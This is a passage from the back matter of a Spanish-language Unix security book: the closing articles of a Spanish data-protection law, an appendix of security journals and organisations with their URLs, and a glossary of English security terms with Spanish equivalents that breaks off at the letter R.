</para><!--l. 1895--><para>  5. Si, en raz&#x00F3;n de las circunstancias concurrentes, se apreciara una cuali&#xFB01;cada disminuci&#x00F3;n de la
culpabilidad del imputado o de la antijuridicidad del hecho, el &#x00F3;rgano sancionador establecer&#x00E1; la cuant&#x02CA;&#x0131;a de
la sanci&#x00F3;n aplicando la escala relativa a la clase de infracciones que preceda inmediatamente en gravedad a
aquella en que se integra la considerada en el caso de que se trate.
<!--br/-->
</para><!--l. 1902--><para>  6. En ning&#x00FA;n caso podr&#x00E1; imponerse una sanci&#x00F3;n m&#x00E1;s grave que la &#xFB01;jada en la Ley para la clase de infracci&#x00F3;n
en la que se integre la que se pretenda sancionar.
<!--br/-->
</para><!--l. 1906--><para>  7. El Gobierno actualizar&#x00E1; peri&#x00F3;dicamente la cuant&#x02CA;&#x0131;a de las sanciones de acuerdo con las variaciones que
experimenten los &#x02CA;&#x0131;ndices de precios.
<!--br/-->Art&#x02CA;&#x0131;culo 46. Infracciones de las Administraciones P&#x00FA;blicas.
</para><!--l. 1911--><para>  1. Cuando las infracciones a que se re&#xFB01;ere el art&#x02CA;&#x0131;culo 44 fuesen cometidas en &#xFB01;cheros de los que sean
responsables las Administraciones P&#x00FA;blicas, el Director de la Agencia de Protecci&#x00F3;n de Datos dictar&#x00E1; una
resoluci&#x00F3;n estableciendo las medidas que procede adoptar para que cesen o se corrijan los efectos de la
infracci&#x00F3;n.
<!--br/-->Esta resoluci&#x00F3;n se noti&#xFB01;car&#x00E1; al responsable del &#xFB01;chero, al &#x00F3;rgano del que dependa jer&#x00E1;rquicamente y a los
afectados si los hubiera.
<!--br/-->
</para><!--l. 1919--><para>  2. El Director de la Agencia podr&#x00E1; proponer tambi&#x00E9;n la iniciaci&#x00F3;n de actuaciones disciplinarias, si
procedieran. El procedimiento y las sanciones a aplicar ser&#x00E1;n las establecidas en la legislaci&#x00F3;n sobre r&#x00E9;gimen
disciplinario de las Administraciones P&#x00FA;blicas.
<!--br/-->
</para><!--l. 1925--><para>  3. Se deber&#x00E1;n comunicar a la Agencia las resoluciones que recaigan en relaci&#x00F3;n con las medidas y
actuaciones a que se re&#xFB01;eren los apartados anteriores.
<!--br/-->

</para><!--l. 1929--><para>  4. El Director de la Agencia comunicar&#x00E1; al Defensor del Pueblo las actuaciones que efect&#x00FA;e y las
resoluciones que dicte al amparo de los apartados anteriores.
<!--br/-->Art&#x02CA;&#x0131;culo 47. Prescripci&#x00F3;n.
</para><!--l. 1935--><para>  1. Las infracciones muy graves prescribir&#x00E1;n a los tres a~nos, las graves a los dos a~nos y las leves al
a~no.
<!--br/-->
</para><!--l. 1938--><para>  2. El plazo de prescripci&#x00F3;n comenzar&#x00E1; a contarse desde el d&#x02CA;&#x0131;a en que la infracci&#x00F3;n se hubiera
cometido.
<!--br/-->
</para><!--l. 1941--><para>  3. Interrumpir&#x00E1; la prescripci&#x00F3;n la iniciaci&#x00F3;n, con conocimiento del interesado, del procedimiento
sancionador, reanud&#x00E1;ndose el plazo de prescripci&#x00F3;n si el expediente sancionador estuviere paralizado durante
m&#x00E1;s de seis meses por causas no imputables al presunto infractor.
<!--br/-->
</para><!--l. 1947--><para>  4. Las sanciones impuestas por faltas muy graves prescribir&#x00E1;n a los tres a~nos, las impuestas por faltas
graves a los dos a~nos y las impuestas por faltas leves al a~no.
<!--br/-->
</para><!--l. 1951--><para>  5. El plazo de prescripci&#x00F3;n de las sanciones comenzar&#x00E1; a contarse desde el d&#x02CA;&#x0131;a siguiente a aquel en que
adquiera &#xFB01;rmeza la resoluci&#x00F3;n por la que se impone la sanci&#x00F3;n.
<!--br/-->
</para><!--l. 1955--><para>  6. La prescripci&#x00F3;n se interrumpir&#x00E1; por la iniciaci&#x00F3;n, con conocimiento del interesado, del procedimiento de
ejecuci&#x00F3;n, volviendo a transcurrir el plazo si el mismo est&#x00E1; paralizado durante m&#x00E1;s de seis meses por causa no
imputable al infractor.
<!--br/-->Art&#x02CA;&#x0131;culo 48. Procedimiento sancionador.
</para><!--l. 1962--><para>  1. Por v&#x02CA;&#x0131;a reglamentaria se establecer&#x00E1; el procedimiento a seguir para la determinaci&#x00F3;n de las infracciones
y la imposici&#x00F3;n de las sanciones a que hace referencia el presente T&#x02CA;&#x0131;tulo.
</para><!--l. 1966--><para>  2. Las resoluciones de la Agencia de Protecci&#x00F3;n de Datos u &#x00F3;rgano correspondiente de la Comunidad
Aut&#x00F3;noma agotan la v&#x02CA;&#x0131;a administrativa.
<!--br/-->Art&#x02CA;&#x0131;culo 49. Potestad de inmovilizaci&#x00F3;n de &#xFB01;cheros.
</para><!--l. 1972--><para>  En los supuestos, constitutivos de infracci&#x00F3;n muy grave, de utilizaci&#x00F3;n o cesi&#x00F3;n il&#x02CA;&#x0131;cita de los datos de car&#x00E1;cter
personal en que se impida gravemente o se atente de igual modo contra el ejercicio de los derechos de los
ciudadanos y el libre desarrollo de la personalidad que la Constituci&#x00F3;n y las leyes garantizan, el Director de
la Agencia de Protecci&#x00F3;n de Datos podr&#x00E1;, adem&#x00E1;s de ejercer la potestad sancionadora, requerir a los
responsables de &#xFB01;cheros de datos de car&#x00E1;cter personal, tanto de titularidad p&#x00FA;blica como privada, la cesaci&#x00F3;n
en la utilizaci&#x00F3;n o cesi&#x00F3;n il&#x02CA;&#x0131;cita de los datos.
<!--br/-->Si el requerimiento fuera desatendido, la Agencia de Protecci&#x00F3;n de Datos podr&#x00E1;, mediante resoluci&#x00F3;n
motivada, inmovilizar tales &#xFB01;cheros a los solos efectos de restaurar los derechos de las personas
afectadas.
</para><section role="center"><title/>
<!--l. 1985--><para> DISPOSICIONES ADICIONALES</para></section>
<!--l. 1988--><para>Primera. Ficheros preexistentes.
</para><!--l. 1990--><para>  Los &#xFB01;cheros y tratamientos automatizados, inscritos o no en el Registro General de Protecci&#x00F3;n de Datos
deber&#x00E1;n adecuarse a la presente Ley Org&#x00E1;nica dentro del plazo de tres a~nos, a contar desde su
entrada en vigor. En dicho plazo, los &#xFB01;cheros de titularidad privada deber&#x00E1;n ser comunicados a la
Agencia de Protecci&#x00F3;n de Datos y las Administraciones P&#x00FA;blicas, responsables de &#xFB01;cheros de
titularidad p&#x00FA;blica, deber&#x00E1;n aprobar la pertinente disposici&#x00F3;n de regulaci&#x00F3;n del &#xFB01;chero o adaptar la
existente.
<!--br/-->
</para><!--l. 1998--><para>  En el supuesto de &#xFB01;cheros y tratamientos no automatizados, su adecuaci&#x00F3;n a la presente Ley Org&#x00E1;nica y la
obligaci&#x00F3;n prevista en el p&#x00E1;rrafo anterior deber&#x00E1; cumplimentarse en el plazo de doce a~nos a contar desde el 24
de octubre de 1995, sin perjuicio del ejercicio de los derechos de acceso, recti&#xFB01;caci&#x00F3;n y cancelaci&#x00F3;n por parte
de los afectados.

<!--br/-->Segunda. Ficheros y Registro de Poblaci&#x00F3;n de las Administraciones P&#x00FA;blicas.
</para><!--l. 2007--><para>  1. La Administraci&#x00F3;n General del Estado y las Administraciones de las Comunidades Aut&#x00F3;nomas podr&#x00E1;n
solicitar al Instituto Nacional de Estad&#x02CA;&#x0131;stica, sin consentimiento del interesado, una copia actualizada del
&#xFB01;chero formado con los datos del nombre, apellidos, domicilio, sexo y fecha de nacimiento que
constan en los padrones municipales de habitantes y en el censo electoral correspondientes
a los territorios donde ejerzan sus competencias, para la creaci&#x00F3;n de &#xFB01;cheros o registros de
poblaci&#x00F3;n.
<!--br/-->
</para><!--l. 2015--><para>  2. Los &#xFB01;cheros o registros de poblaci&#x00F3;n tendr&#x00E1;n como &#xFB01;nalidad la comunicaci&#x00F3;n de los distintos &#x00F3;rganos de
cada administraci&#x00F3;n p&#x00FA;blica con los interesados residentes en los respectivos territorios, respecto a las
relaciones jur&#x02CA;&#x0131;dico administrativas derivadas de las competencias respectivas de las Administraciones
P&#x00FA;blicas.
<!--br/-->Tercera. Tratamiento de los expedientes de las derogadas Leyes de Vagos y Maleantes y
de Peligrosidad y Rehabilitaci&#x00F3;n Social.
</para><!--l. 2024--><para>  Los expedientes espec&#x02CA;&#x0131;&#xFB01;camente instruidos al amparo de las derogadas Leyes de Vagos y Maleantes, y de
Peligrosidad y Rehabilitaci&#x00F3;n Social, que contengan datos de cualquier &#x02CA;&#x0131;ndole susceptibles de afectar a la
seguridad, al honor, a la intimidad o a la imagen de las personas, no podr&#x00E1;n ser consultados sin que
medie consentimiento expreso de los afectados, o hayan transcurrido 50 a~nos desde la fecha de
aqu&#x00E9;llos.
<!--br/-->En este &#x00FA;ltimo supuesto, la Administraci&#x00F3;n General del Estado, salvo que haya constancia expresa del
fallecimiento de los afectados, pondr&#x00E1; a disposici&#x00F3;n del solicitante la documentaci&#x00F3;n, suprimiendo de la misma
los datos aludidos en el p&#x00E1;rrafo anterior, mediante la utilizaci&#x00F3;n de los procedimientos t&#x00E9;cnicos pertinentes en
cada caso.
<!--br/-->Cuarta. Modi&#xFB01;caci&#x00F3;n del art&#x02CA;&#x0131;culo 112.4 de la Ley General Tributaria.
</para><!--l. 2039--><para>  El apartado cuarto del art&#x02CA;&#x0131;culo 112 de la Ley General Tributaria pasa a tener la siguiente
redacci&#x00F3;n:
<!--br/-->&#x2018;4. La cesi&#x00F3;n de aquellos datos de car&#x00E1;cter personal, objeto de tratamiento que se debe efectuar a la
Administraci&#x00F3;n tributaria conforme a lo dispuesto en el art&#x02CA;&#x0131;culo 111, en los apartados anteriores de
este art&#x02CA;&#x0131;culo o en otra norma de rango legal, no requerir&#x00E1; el consentimiento del afectado. En
este &#x00E1;mbito tampoco ser&#x00E1; de aplicaci&#x00F3;n lo que respecto a las Administraciones P&#x00FA;blicas establece
el apartado 1 del art&#x02CA;&#x0131;culo 21 de la Ley Org&#x00E1;nica de Protecci&#x00F3;n de Datos de car&#x00E1;cter personal&#x2019;.
<!--br/-->Quinta. Competencias del Defensor del Pueblo y &#x00F3;rganos auton&#x00F3;micos semejantes.
</para><!--l. 2052--><para>  Lo dispuesto en la presente Ley Org&#x00E1;nica se entiende sin perjuicio de las competencias del Defensor del
Pueblo y de los &#x00F3;rganos an&#x00E1;logos de las Comunidades Aut&#x00F3;nomas.
<!--br/-->Sexto. Modi&#xFB01;caci&#x00F3;n del art&#x02CA;&#x0131;culo 24.3 de la Ley de Ordenaci&#x00F3;n y Supervisi&#x00F3;n de los Seguros
Privados.
</para><!--l. 2059--><para>  Se modi&#xFB01;ca el art&#x02CA;&#x0131;culo 24.3, p&#x00E1;rrafo 2<informalequation><graphic 
fileref="unixsec557x.gif"></graphic></informalequation> de la Ley 30/1995, de 8 de noviembre, de Ordenaci&#x00F3;n y Supervisi&#x00F3;n
de los Seguros Privados con la siguiente redacci&#x00F3;n:
<!--br/-->&#x2018;Las entidades aseguradoras podr&#x00E1;n establecer &#xFB01;cheros comunes que contengan datos de car&#x00E1;cter personal
para la liquidaci&#x00F3;n de siniestros y la colaboraci&#x00F3;n estad&#x02CA;&#x0131;stico actuarial con la &#xFB01;nalidad de permitir la
tari&#xFB01;caci&#x00F3;n y selecci&#x00F3;n de riesgos y la elaboraci&#x00F3;n de estudios de t&#x00E9;cnica aseguradora. La cesi&#x00F3;n de datos a los
citados &#xFB01;cheros no requerir&#x00E1; el consentimiento previo del afectado, pero s&#x02CA;&#x0131; la comunicaci&#x00F3;n al mismo de la
posible cesi&#x00F3;n de sus datos personales a &#xFB01;cheros comunes para los &#xFB01;nes se~nalados con expresa indicaci&#x00F3;n del
responsable para que se puedan ejercitar los derechos de acceso, recti&#xFB01;caci&#x00F3;n y cancelaci&#x00F3;n previstos en la
Ley.
<!--br/-->Tambi&#x00E9;n podr&#x00E1;n establecerse &#xFB01;cheros comunes cuya &#xFB01;nalidad sea prevenir el fraude en el seguro sin que sea
necesario el consentimiento del afectado. No obstante, ser&#x00E1; necesaria en estos casos la comunicaci&#x00F3;n al
afectado, en la primera introducci&#x00F3;n de sus datos, de qui&#x00E9;n sea el responsable del &#xFB01;chero y de las formas de
ejercicio de los derechos de acceso, recti&#xFB01;caci&#x00F3;n y cancelaci&#x00F3;n.
<!--br/-->En todo caso, los datos relativos a la salud s&#x00F3;lo podr&#x00E1;n ser objeto de tratamiento con el consentimiento
expreso del afectado.&#x2019;
</para><section role="center"><title/>

<!--l. 2080--><para> DISPOSICIONES TRANSITORIAS</para></section>
<!--l. 2084--><para>Primera. Tratamientos creados por Convenios Internacionales.
</para><!--l. 2086--><para>  La Agencia de Protecci&#x00F3;n de Datos ser&#x00E1; el organismo competente para la protecci&#x00F3;n de las personas f&#x02CA;&#x0131;sicas
en lo que respecta al tratamiento de datos de car&#x00E1;cter personal respecto de los tratamientos establecidos en
cualquier Convenio Internacional del que sea parte Espa~na que atribuya a una autoridad nacional de
control esta competencia, mientras no se cree una autoridad diferente para este cometido en desarrollo del
Convenio.
<!--br/-->Segunda. Utilizaci&#x00F3;n del Censo Promocional.
</para><!--l. 2095--><para>  Reglamentariamente se desarrollar&#x00E1;n los procedimientos de formaci&#x00F3;n del Censo Promocional, de oposici&#x00F3;n
a aparecer en el mismo, de puesta a disposici&#x00F3;n de sus solicitantes, y de control de las listas
difundidas. El Reglamento establecer&#x00E1; los plazos para la puesta en operaci&#x00F3;n del Censo Promocional.
<!--br/-->Tercera. Subsistencia de normas preexistentes.
</para><!--l. 2103--><para>  Hasta tanto se lleven a efecto las previsiones de la Disposici&#x00F3;n Final Primera de esta Ley, continuar&#x00E1;n en
vigor, con su propio rango, las normas reglamentarias existentes y, en especial, los Reales Decretos
428/1993, de 26 de marzo, 1332/1994, de 20 de junio y 994/1999, de 11 de junio, en cuanto no se opongan
a la presente Ley.
</para><section role="center"><title/>
<!--l. 2108--><para> DISPOSICI&#x00D3;N DEROGATORIA</para></section>
<!--l. 2112--><para>&#x00DA;nica.
</para><!--l. 2114--><para>  Queda derogada la Ley Org&#x00E1;nica 5/1992, de 29 de octubre, de regulaci&#x00F3;n del tratamiento automatizado de
los datos de car&#x00E1;cter personal.
</para><section role="center"><title/>
<!--l. 2116--><para> DISPOSICIONES FINALES</para></section>
<!--l. 2120--><para>Primera. Habilitaci&#x00F3;n para el desarrollo reglamentario.
</para><!--l. 2122--><para>  El Gobierno aprobar&#x00E1;, o modi&#xFB01;car&#x00E1;, las disposiciones reglamentarias necesarias para la aplicaci&#x00F3;n y
desarrollo de la presente Ley.
<!--br/-->Segunda. Preceptos con car&#x00E1;cter de Ley Ordinaria.
</para><!--l. 2127--><para>  Los t&#x02CA;&#x0131;tulos IV, VI excepto el &#x00FA;ltimo inciso del p&#x00E1;rrafo 4 del art&#x02CA;&#x0131;culo 36 y VII de la presente Ley, la
Disposici&#x00F3;n Adicional Cuarta, la Disposici&#x00F3;n Transitoria Primera y la Final Primera, tienen el car&#x00E1;cter de Ley
Ordinaria.
<!--br/-->Tercera. Entrada en vigor.
</para><!--l. 2134--><para>  La presente Ley entrar&#x00E1; en vigor en el plazo de un mes, contado desde su publicaci&#x00F3;n en el Bolet&#x02CA;&#x0131;n O&#xFB01;cial
del Estado.


</para><!--l. 1--><para>

<anchor 
   id="x1-355002r363"  ></anchor>
  </para></section><!--end section--><anchor 
   id="x1-356000C"  ></anchor>Recursos de inter&#x00E9;s en INet
  <!--l. 2--><section 
role="section"><title><abbrev role="title-mark">C.1</abbrev><anchor 
   id="x1-357000C.1"  ></anchor>Publicaciones peri&#x00F3;dicas</title>
<!--l. 3--><para>
     </para><itemizedlist>
     <listitem>
     <!--l. 4--><para>Journal of Computer Security: http://www.jcompsec.mews.org/
     </para></listitem>
     <listitem>
     <!--l. 5--><para>Disaster Recovery Journal: http://www.drj.com/
     </para></listitem>
     <listitem>
     <!--l. 6--><para>Computer &#x0026; Security: http://www.elsevier.nl/locate/inca/405877l
     </para></listitem>
     <listitem>
     <!--l. 7--><para>Operating Systems Security Issues: http://www.jjtc.com/Security/os.htm
     </para></listitem>
     <listitem>
     <!--l. 8--><para>International Journal of Forensic Computing: http://www.forensic-computing.com/
     </para></listitem>
     <listitem>
     <!--l. 9--><para>Journal of Internet Security: http://www.csci.ca/jisec/
     </para></listitem>
     <listitem>
     <!--l. 10--><para>Computer and Communications Security Reviews:
     <!--br/-->http://www.anbar.co.uk/computing/ccsr/archive.html
     </para></listitem>
     <listitem>
     <!--l. 12--><para>Info Security News: http://www.infosecnews.com/
     </para></listitem>
     <listitem>
     <!--l. 13--><para>Computer Forensics Online: http://www.shk-dplc.com/cfo/
     </para></listitem>
     <listitem>
     <!--l. 14--><para>Information Security Magazine: http://www.infosecuritymag.com/
     </para></listitem>
     <listitem>
     <!--l. 15--><para>Security Advisor Magazine: http://www.advisor.com/wHome.nsf/wPages/SAmain/
     </para></listitem>
     <listitem>
     <!--l. 16--><para>Security Management Magazine: http://www.securitymanagement.com/
     </para></listitem>
     <listitem>
     <!--l. 17--><para>Phrack Underground Magazine: http://www.phrack.com/

     </para></listitem>
     <listitem>
     <!--l. 18--><para>Security Magazine: http://www.secmag.com/
     </para></listitem>
     <listitem>
     <!--l. 19--><para>2600 Magazine: http://www.2600.com/
     </para></listitem>
     <listitem>
     <!--l. 20--><para>Linux Journal: http://www.ssc.com/lj/index.html
     </para></listitem>
     <listitem>
     <!--l. 21--><para>UnixWorld Online Magazine: http://www.wcmh.com/uworld/
     </para></listitem>
     <listitem>
     <!--l. 22--><para>Infowar: http://www.infowar.com/
     </para></listitem>
     <listitem>
     <!--l. 23--><para>Linux Gazette: ftp://ftp.rediris.es/software/linux/lg/
     </para></listitem>
     <listitem>
     <!--l. 24--><para>Internet Security Review Magazine: http://www.isr.net/
     </para></listitem>
     <listitem>
     <!--l. 25--><para>UNIX Review: http://www.unixreview.com/
     </para></listitem>
     <listitem>
     <!--l. 26--><para>Sun Expert: http://www.netline.com/sunex/
     </para></listitem>
     <listitem>
     <!--l. 27--><para>Sun World: http://www.sunworld.com/
     </para></listitem>
     <listitem>
     <!--l. 28--><para>Linux World: http://www.linuxworld.com/
     </para></listitem>
     <listitem>
     <!--l. 29--><para>Sys Admin: http://www.samag.com/
     </para></listitem>
     <listitem>
     <!--l. 30--><para>SCO World Magazine: http://www.scoworld.com/
     </para></listitem>
     <listitem>
     <!--l. 31--><para>RS/Magazine: http://www.netline.com/rs/

     </para></listitem>
     <listitem>
     <!--l. 32--><para>Unix Guru Universe: http://www.polaris.net/ugu/
     </para></listitem>
     <listitem>
     <!--l. 33--><para>Security Alert For Enterprise Resources http://siamrelay.com/safer/
     </para></listitem>
     <listitem>
     <!--l. 34--><para>ACM Trans. on Information and System Security: http://www.acm.org/pubs/tissec/
     </para></listitem>
     <listitem>
     <!--l. 35--><para>Cryptologia:
     <!--br/-->http://www.dean.usma.edu/math/resource/pubs/cryptolo/index.htm
     </para></listitem>
     <listitem>
     <!--l. 37--><para>Journal of Cryptology: http://www.iacr.org/jofc/jofc.html
     </para></listitem>
     <listitem>
     <!--l. 38--><para>Journal of Computer Security: http://www.jcompsec.mews.org/
     </para></listitem>
     <listitem>
     <!--l. 39--><para>The Privacy Forum: http://www.vortex.com/privacy.html
     </para></listitem>
     <listitem>
     <!--l. 40--><para>IEEE-CS TC on Security and Privacy:
     <!--br/-->http://www.itd.nrl.navy.mil/ITD/5540/ieee/cipher/
     </para></listitem>
     <listitem>
     <!--l. 42--><para>Computer Underground Digest: http://sun.soci.niu.edu/~cudigest/
     </para></listitem>
     <listitem>
     <!--l. 43--><para>NetWatchers: http://www.ionet.net/~mdyer/netwatch.shtml
     </para></listitem>
     <listitem>
     <!--l. 44--><para>Journal for Internet Banking and Commerce: http://www.arraydev.com/commerce/JIBC/
     </para></listitem>
     <listitem>
     <!--l. 45--><para>Data Security Letter: http://ww.tis.com/Home/DataSecurityLetter.html
     </para></listitem>
     <listitem>
     <!--l. 46--><para>Journal of Infrastructural Warfare: http://www.iwar.org/</para></listitem></itemizedlist>
<!--l. 48--><para>
  </para></section><!--end section--><!--l. 48--><section 
role="section"><title><abbrev role="title-mark">C.2</abbrev><anchor 
   id="x1-358000C.2"  ></anchor>Organizaciones</title>

<!--l. 49--><para>
  </para><!--l. 49--><section 
role="subsection"><title><abbrev role="title-mark">C.2.1</abbrev><anchor 
   id="x1-359000C.2.1"  ></anchor>Profesionales</title>
<!--l. 50--><para>
     </para><itemizedlist>
     <listitem>
     <!--l. 51--><para>USENIX: http://www.usenix.org/
     </para></listitem>
     <listitem>
     <!--l. 52--><para>CERT: http://www.cert.org/
     </para></listitem>
     <listitem>
     <!--l. 53--><para>NCSA: http://www.ncsa.org/
     </para></listitem>
     <listitem>
     <!--l. 54--><para>AECSI: http://aecsi.rediris.es/
     </para></listitem>
     <listitem>
     <!--l. 55--><para>SANS Institute: http://www.sans.org/
     </para></listitem>
     <listitem>
     <!--l. 56--><para>ICSA: http://www.icsa.net/
     </para></listitem>
     <listitem>
     <!--l. 57--><para>ISC2 Organization: http://www.isc2.org/
     </para></listitem>
     <listitem>
     <!--l. 58--><para>The Computer Security Institute: http://www.gocsi.com/
     </para></listitem>
     <listitem>
     <!--l. 59--><para>IEEE Computer Society: http://www.computer.org/
     </para></listitem>
     <listitem>
     <!--l. 60--><para>IEEE-CS TC on Security and Privacy: http://www.itd.nrl.navy.mil/ITD/5540/ieee/
     </para></listitem>
     <listitem>
     <!--l. 61--><para>ACM SIGSAC: http://www.acm.org/sig<informalequation><graphic 
fileref="unixsec558x.gif"></graphic></informalequation>hp/SIGSAC.html
     </para></listitem>
     <listitem>
     <!--l. 62--><para>High&#x2013;Tech Crime Investigators Association: http://htcia.org/
     </para></listitem>
     <listitem>
     <!--l. 63--><para>FIRST: http://www.first.org/first/

     </para></listitem>
     <listitem>
     <!--l. 64--><para>IACR: http://www.iacr.org/
     </para></listitem>
     <listitem>
     <!--l. 65--><para>ACSA: http://www.acsac.org/
     </para></listitem>
     <listitem>
     <!--l. 66--><para>Association for Biometrics: http://www.afb.org.uk/
     </para></listitem>
     <listitem>
     <!--l. 67--><para>Smart Card Forum: http://www.smartcardforum.org/</para></listitem></itemizedlist>
<!--l. 69--><para>
  </para></section><!--end subsection--><!--l. 69--><section 
role="subsection"><title><abbrev role="title-mark">C.2.2</abbrev><anchor 
   id="x1-360000C.2.2"  ></anchor>Gubernamentales/militares</title>
<!--l. 70--><para>
     </para><itemizedlist>
     <listitem>
     <!--l. 71--><para>Computer Security Information: http://www.alw.nih.gov/Security/security.html
     </para></listitem>
     <listitem>
     <!--l. 72--><para>The NSA/CSS INFOSEC Page: http://www.nsa.gov:8080/isso/
     </para></listitem>
     <listitem>
     <!--l. 73--><para>NIST Computer Security Resource Clearinghouse: http://csrc.nist.gov/
     </para></listitem>
     <listitem>
     <!--l. 74--><para>NIST Computer Systems Laboratory: http://www.ncsl.nist.gov/
     </para></listitem>
     <listitem>
     <!--l. 75--><para>Computer Security Technology Center: http://ciac.llnl.gov/cstc/
     </para></listitem>
     <listitem>
     <!--l. 76--><para>(CCIPS) - Computer Crime and Intellectual Property Section:
     <!--br/-->http://www.usdoj.gov/criminal/cybercrime/
     </para></listitem>
     <listitem>
     <!--l. 78--><para>DoD Network Information Center: http://nic.ddn.mil/
     </para></listitem>
     <listitem>
     <!--l. 79--><para>DoD Security Institute: http://www.dtic.mil/dodsi/
     </para></listitem>
     <listitem>
     <!--l. 80--><para>FBI Computer Crime Squad: http://www.fbi.gov/compcrim.htm

     </para></listitem>
     <listitem>
     <!--l. 81--><para>Defense Information Systems Agency: http://www.disa.mil/
     </para></listitem>
     <listitem>
     <!--l. 82--><para>CIAC Security Website: http://ciac.llnl.gov/
     </para></listitem>
     <listitem>
     <!--l. 83--><para>National Security Agency: http://www.nsa.gov/
     </para></listitem>
     <listitem>
     <!--l. 84--><para>Air Force CERT: http://afcert.kelly.af.mil/
     </para></listitem>
     <listitem>
     <!--l. 85--><para>President&#x02CA;


     </para><!--l. 1--><para>

<anchor 
   id="x1-360001r363"  ></anchor>
     </para></section><!--end subsection--></section><!--end section--><anchor 
   id="x1-361000D"  ></anchor>Glosario de t&#x00E9;rminos anglosajones
     <section role="center"><title/>
     <!--l. 2--><para> &#x2013; A &#x2013;
     </para></section>
     <!--l. 5--><para>Access Control List: Lista de Control de Acceso (ACL).
     <!--br/-->Accountability: Capacidad de ser registrado.
     <!--br/-->Aging Password: Envejecimiento de contrase~nas.
     <!--br/-->Anomaly Detection: Detecci&#x00F3;n de anomal&#x02CA;&#x0131;as.
     <!--br/-->Audit Trail: Registro de auditor&#x02CA;&#x0131;a.
     <!--br/-->Authentication by assertion: Autenticaci&#x00F3;n por declaraci&#x00F3;n.
     <!--br/-->Availability: Disponibilidad.
     <!--br/-->
     </para><section role="center"><title/>
     <!--l. 12--><para> &#x2013; B &#x2013;
     </para></section>
     <!--l. 15--><para>Back Door: Puerta trasera.
     <!--br/-->Backup: Copia de seguridad.
     <!--br/-->Backup level: Nivel de copia de seguridad.
     <!--br/-->Backup plan: Plan de contingencia.
     <!--br/-->Bu&#xFB00;er Over&#xFB02;ow: Desbordamiento de pila, desbordamiento de bu&#xFB00;er.
     <!--br/-->Buggy Software: Software incorrecto.
     <!--br/-->Bug: Agujero.
     <!--br/-->
     </para><section role="center"><title/>
     <!--l. 22--><para> &#x2013; C &#x2013;
     </para></section>
     <!--l. 25--><para>Con&#xFB01;dentiality: Con&#xFB01;dencialidad.
     <!--br/-->Con&#xFB01;nement Channel: Canal cubierto u oculto.
     <!--br/-->Contingency plan: Plan de contingencia.
     <!--br/-->Covert Channel: Canal cubierto u oculto.
     <!--br/-->Covert storage channel: Canal oculto de almacenamiento.
     <!--br/-->Covert timing channel: Canal oculto de temporizaci&#x00F3;n.
     <!--br/-->Cryptoperiod: Tiempo de expiraci&#x00F3;n de clave, vigencia de clave.
     <!--br/-->
     </para><section role="center"><title/>
     <!--l. 32--><para> &#x2013; D &#x2013;
     </para></section>
     <!--l. 35--><para>De&#x2013;Militarized Zone: Zona desmilitarizada, red perim&#x00E9;trica (DMZ).
     <!--br/-->Denial of Service: Negaci&#x00F3;n de servicio (DoS).
     <!--br/-->Dependability: Con&#xFB01;abilidad.
     <!--br/-->Discretionary Access Control: Control de accesos discrecional (DAC).
     <!--br/-->Dual control: Conocimiento parcial.
     <!--br/-->

     </para><section role="center"><title/>
     <!--l. 40--><para> &#x2013; E &#x2013;
     </para></section>
     <!--l. 43--><para>Eavesdropping: Fisgoneo, interceptaci&#x00F3;n.
     <!--br/-->Entrapment: Trampeado.
     <!--br/-->
     </para><section role="center"><title/>
     <!--l. 45--><para> &#x2013; F &#x2013;
     </para></section>
     <!--l. 48--><para>Fault: Fallo.
     <!--br/-->Firewall: Cortafuegos.
     <!--br/-->
     </para><section role="center"><title/>
     <!--l. 50--><para> &#x2013; G &#x2013;
     </para></section>
     <!--l. 53--><para>Group Identi&#xFB01;er: Identi&#xFB01;cador de grupo (GID).
     <!--br/-->
     </para><section role="center"><title/>
     <!--l. 54--><para> &#x2013; H &#x2013;
     </para></section>
     <!--l. 57--><para>Hash Function: Funci&#x00F3;n resumen.
     <!--br/-->Honeypot: Tarro de miel, sistema de decepci&#x00F3;n.
     <!--br/-->Host authentication: Autenticaci&#x00F3;n por m&#x00E1;quina.
     <!--br/-->Host&#x2013;based IDS: Sistema de detecci&#x00F3;n de intrusos basado en m&#x00E1;quina.
     <!--br/-->
     </para><section role="center"><title/>
     <!--l. 61--><para> &#x2013; I &#x2013;
     </para></section>
     <!--l. 64--><para>Impersonation: Falseamiento, enmascaramiento.
     <!--br/-->Integrity: Integridad.
     <!--br/-->Intrusion Detection System: Sistema de detecci&#x00F3;n de intrusos (IDS).
     <!--br/-->Isolation: Aislamiento.
     <!--br/-->
     </para><section role="center"><title/>
     <!--l. 68--><para> &#x2013; J &#x2013;
     </para></section>
     <!--l. 71--><para>Jailing: Encarcelamiento.
     <!--br/-->
     </para><section role="center"><title/>

     <!--l. 72--><para> &#x2013; L &#x2013;
     </para></section>
     <!--l. 75--><para>Leakage: Filtraci&#x00F3;n.
     <!--br/-->Log File Monitor: Monitor de registros (LFM).
     <!--br/-->Logic Bomb: Bomba l&#x00F3;gica.
     <!--br/-->
     </para><section role="center"><title/>
     <!--l. 78--><para> &#x2013; M &#x2013;
     </para></section>
     <!--l. 81--><para>Malware: Software malicioso.
     <!--br/-->Mandatory Access Control: Control de accesos obligatorio (MAC).
     <!--br/-->Masquerade: Mascarada, enmascaramiento.
     <!--br/-->Mimicking: Falseamiento, enmascaramiento.
     <!--br/-->Misuse Detection: Detecci&#x00F3;n de usos indebidos.
     <!--br/-->Multilevel security: Seguridad multinivel (MLS).
     <!--br/-->
     </para><section role="center"><title/>
     <!--l. 87--><para> &#x2013; N &#x2013;
     </para></section>
     <!--l. 90--><para>Need to know: Necesidad de saber.
     <!--br/-->Network&#x2013;based IDS: Sistema de detecci&#x00F3;n de intrusos basado en red.
     <!--br/-->Notarization: Certi&#xFB01;caci&#x00F3;n.
     <!--br/-->
     </para><section role="center"><title/>
     <!--l. 93--><para> &#x2013; O &#x2013;
     </para></section>
     <!--l. 96--><para>One Time Password: Clave de un solo uso, clave de uso &#x00FA;nico (OTP).
     <!--br/-->
     </para><section role="center"><title/>
     <!--l. 97--><para> &#x2013; P &#x2013;
     </para></section>
     <!--l. 100--><para>Passive Wiretapping: Fisgoneo, interceptaci&#x00F3;n.
     <!--br/-->Password: Clave, contrase~na.
     <!--br/-->Patch: Parche.
     <!--br/-->Pattern Matching: Comparaci&#x00F3;n y emparejamiento de patrones.
     <!--br/-->Personal Identi&#xFB01;cation Number: N&#x00FA;mero de identi&#xFB01;caci&#x00F3;n personal (PIN).
     <!--br/-->Plausible Deniability: Negaci&#x00F3;n creible.
     <!--br/-->Privacy: Privacidad.
     <!--br/-->
     </para><section role="center"><title/>
     <!--l. 107--><para> &#x2013; R &#x2013;
